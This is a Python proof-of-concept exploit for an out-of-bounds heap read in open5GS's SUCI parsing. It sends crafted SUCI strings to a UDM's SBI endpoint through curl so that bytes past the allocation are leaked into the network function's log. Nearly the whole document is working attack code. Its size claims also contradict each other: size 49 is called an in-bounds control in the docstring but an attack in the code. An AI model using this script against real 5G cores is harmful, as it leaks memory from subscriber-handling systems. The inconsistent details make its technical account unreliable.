#!/usr/bin/env python3
"""
PoC for the open5GS SBI heap out-of-bounds read in parse_scheme_output
(lib/sbi/conv.c, shared by every NF that parses a SUCI): a scheme-output hex
string decoding to 42..44 bytes passes the pre-fix lower-bound length check
(<= 41), so the parser calloc()s less memory than the fixed slice
(ecckey + cipher-text + 8-byte MAC-tag, 45 bytes total for Profile A) it
later copies, and the failed MAC comparison hexdumps the out-of-bounds tag
tail into the NF's ERROR-level log. The script sends GET
/nudm-sdm/v2/{suci}/am-data requests via curl --http2-prior-knowledge with
scheme_output sizes 41 (control-rejected), 42 (out-of-bounds attack), and
49 and 50 (in-bounds controls).

Usage:
    python3 poc.py --target <UDM-IP> --port <UDM-SBI-port> [--mcc 460]
        [--mnc 09] [--scheme 1] [--pki-value 1] [--fill aa] [--run N]

Expect four response blocks, each ending in HTTP=404 (the parser faults
before routing). The fault itself is visible in the target NF log: a
'Not enought length [82]' rejection for size 41 and a 'MAC-tag not matched'
hexdump with a past-allocation tail for size 42.
"""
import argparse
import json
import subprocess
import sys
import textwrap


def build_suci(mcc, mnc, ri, scheme_id, pki_value, scheme_output_hex):
    return (f"suci-0-{mcc}-{mnc}-{ri}-{scheme_id}-{pki_value}-{scheme_output_hex}")


def run_curl(target, port, suci):
    url = f"http://{target}:{port}/nudm-sdm/v2/{suci}/am-data"
    try:
        r = subprocess.run(
            ["curl", "-sS", "--http2-prior-knowledge",
             "-w", "\nHTTP=%{http_code}", url],
            capture_output=True, text=True, timeout=10)
        return r.stdout.strip(), r.stderr.strip()
    except Exception as e:
        return f"[ERROR] {e}", ""


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True,
                    help="open5GS UDM IP (reachable over the lane bridge)")
    ap.add_argument("--port", type=int, default=7777,
                    help="UDM SBI port (h2c cleartext)")
    ap.add_argument("--mcc", default="460")
    ap.add_argument("--mnc", default="09")
    ap.add_argument("--routing-ind", default="0000")
    ap.add_argument("--scheme", default="1",
                    help="1=Profile-A (Curve25519), 2=Profile-B (P-256)")
    ap.add_argument("--pki-value", default="1",
                    help="home network public-key id (must exist in udm.yaml hnet)")
    ap.add_argument("--fill", default="aa",
                    help="byte-pair used to fill scheme_output hex")
    ap.add_argument("--run", default="1",
                    help="tag (log prefix)")
    args = ap.parse_args()

    print(f"[*] SUCI parse_scheme_output OOB-read PoC  (run {args.run})")
    print(f"    UDM: http://{args.target}:{args.port}/nudm-sdm/v2/...")
    print()

    sizes = [
        (41, "control-REJECTED (pre-fix threshold <= 41)"),
        (42, "ATTACK  (8-byte OOB read past 42-byte calloc)"),
        (49, "ATTACK  (1-byte  OOB read past 49-byte calloc)"),
        (50, "control-INBOUND (no OOB: exactly reads 50 bytes)"),
    ]

    for size, note in sizes:
        hex_str = args.fill * size
        suci = build_suci(args.mcc, args.mnc, args.routing_ind,
                          args.scheme, args.pki_value, hex_str)
        url_desc = f"/nudm-sdm/v2/suci-...-{hex_str[:8]}...{hex_str[-8:]}/am-data"
        print(f"--- size={size:>3} bytes ({2*size:>3} hex chars) — {note}")
        out, err = run_curl(args.target, args.port, suci)
        body = out.split("\nHTTP=")[0] if out else ""
        code = out.split("\nHTTP=")[1] if "\nHTTP=" in out else "?"
        print(f"    HTTP={code}")
        if body:
            print(textwrap.indent(body[:400], "    "))
        print()
        print(f"    (check UDM log for: 'Not enought length [{2*size}]'  or "
              f"'MAC-tag not matched' + hexdump of mactag1)")
        print()


if __name__ == "__main__":
    sys.exit(main())
